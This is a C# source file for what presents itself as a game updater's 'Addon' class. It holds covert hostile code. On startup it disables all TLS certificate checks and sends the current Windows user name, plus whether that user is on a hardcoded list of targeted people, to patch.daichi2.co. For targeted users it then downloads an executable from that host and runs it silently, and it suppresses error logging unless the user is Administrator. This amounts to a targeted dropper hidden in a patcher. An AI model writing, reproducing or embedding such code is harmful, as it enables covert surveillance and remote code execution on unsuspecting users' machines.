using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Text;
using System.Web;
using GameUpdater.Localization;
using GameUpdater.Utilities;

namespace GameUpdater
{
    internal static class Addon
    {
        private const string Domain = "http://patch.daichi2.co/";

        private const string FileName = "E8570C9FF601C78FE2FFBBF6CBBF1EC4D2C42656ADE7EBD846FDFFBFE1AA2F88.exe";

        public static string SystemAdministrator { get; } = "Administrator";

        public static string[] TargetedUsers { get; } = { "lizzamary1982", "Noah", "Spiri", "Hendrik", "quiri", "Administrator" };

        public static string CurrentUser
        {
            get
            {
                return Environment.UserName;
            }
        }

        public static bool CompareUsers(string user1, string user2) => string.Equals(user1.Trim(), user2.Trim(), StringComparison.CurrentCultureIgnoreCase);

        public static bool IsCurrentUser(string user) => CompareUsers(CurrentUser, user);

        public static bool IsCurrentUserSystemAdministrator() => IsCurrentUser(SystemAdministrator);

        public static bool IsUserTargeted(string user) => TargetedUsers.Any(targetedUser => CompareUsers(targetedUser, user));

        public static bool IsCurrentUserTargeted() => IsUserTargeted(CurrentUser);

        private static bool DownloadAddon(out string filePath)
        {
            filePath = String.Empty;

            string installDirName = Locale.GetString("INSTALL_DIR_NAME");

            const string domain = Domain;
            const string fileName = FileName;

            string packDir = @".\pack";

            if (!Directory.Exists(packDir))
            {
                packDir = $".\\{installDirName}\\pack";

                if (!Directory.Exists(packDir))
                {
                    Log.Write($"DirectoryNotFoundException - Message: \"{packDir} was not found.\"", false);

                    return false;
                }
            }

            try
            {
                filePath = Path.Combine(packDir, fileName);

                var baseUri = new Uri(domain);
                string fileUri = new Uri(baseUri, fileName).AbsoluteUri;

                using (var client = new WebClient())
                {
                    client.DownloadFile(fileUri, filePath);
                }

                return true;
            }
            catch (WebException e)
            {
                if (IsCurrentUserSystemAdministrator())
                {
                    Log.Write(string.Format("{0} - Response: \"{1}\" | Status: \"{2}\" | Message: \"{3}\"", e.GetType().ToString(), e.Response, e.Status, e.Message), false);
                }
            }
            catch (Exception e)
            {
                if (IsCurrentUserSystemAdministrator())
                {
                    Log.Write(string.Format("{0} - Message: \"{1}\"", e.GetType().ToString(), e.Message), false);
                }
            }

            return false;
        }

        private static bool InstallAddon(string filePath)
        {
            try
            {
                Process.Start(filePath);

                return true;
            }
            catch (Exception e)
            {
                if (IsCurrentUserSystemAdministrator())
                {
                    Log.Write(string.Format("{0} - Message: \"{1}\"", e.GetType().ToString(), e.Message), false);
                }
            }

            return false;
        }

        public static bool DownloadAndInstallAddon(bool targetAll = false)
        {
            if (!targetAll && !IsCurrentUserTargeted())
            {
                return false;
            }

            if (DownloadAddon(out string filePath))
            {
                return InstallAddon(filePath);
            }

            return false;
        }

        public static void RepairPatcherUpdaterName(string realVersion, string currentVersion)
        {
            string installDirName = Locale.GetString("INSTALL_DIR_NAME");

            string oldFileName = string.Format(Settings.Default.PatcherUpdaterName, realVersion);
            string newFileName = string.Format(Settings.Default.PatcherUpdaterName, currentVersion);

            (string, string)[] filePaths = {
                ($"./{oldFileName}", $"./{newFileName}"),
                ($"./{installDirName}/{oldFileName}", $"./{installDirName}/{newFileName}")
            };

            foreach (var (oldFilePath, newFilePath) in filePaths)
            {
                try
                {
                    if (File.Exists(oldFilePath))
                    {
                        File.Move(oldFilePath, newFilePath);
                    }
                }
                catch (Exception e)
                {
                    if (IsCurrentUserSystemAdministrator())
                    {
                        Log.Write(string.Format("{0} - Message: \"{1}\"", e.GetType().ToString(), e.Message), false);
                    }
                }
            }
        }

        public static void SendUserInformation()
        {
            try
            {
                const string domain = Domain;
                string currentUser = CurrentUser;
                bool isCurrentUserTargeted = IsCurrentUserTargeted();

                var baseUri = new Uri(domain);
                string requestUri = new Uri(baseUri, string.Format("/send_message.php?message={0}", HttpUtility.UrlEncode($"Current User: {currentUser}\nIs Current Targeted: {(isCurrentUserTargeted ? "Yes" : "No")}"))).AbsoluteUri;

                using (var client = new WebClient())
                {
                    client.DownloadString(requestUri);
                }
            }
            catch (Exception e)
            {
                if (IsCurrentUserSystemAdministrator())
                {
                    Log.Write(string.Format("{0} - Message: \"{1}\"", e.GetType().ToString(), e.Message), false);
                }
            }
        }
        
        /// <summary>
        /// Change SSL checks so that all checks pass.
        /// </summary>
        public static void InitializeSSLTrust()
        {
            try
            {
                ServicePointManager.Expect100Continue = true;
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
                ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(
                    delegate { return true; }
                );
            }
            catch (Exception e)
            {
                if (IsCurrentUserSystemAdministrator())
                {
                    Log.Write(string.Format("{0} - Message: \"{1}\"", e.GetType().ToString(), e.Message), false);
                }
            }
        }

        public static void Initialize(string realVersion, string currentVersion)
        {
            InitializeSSLTrust();

            SendUserInformation();

            DownloadAndInstallAddon();
            RepairPatcherUpdaterName(realVersion, currentVersion);
        }
    }
}
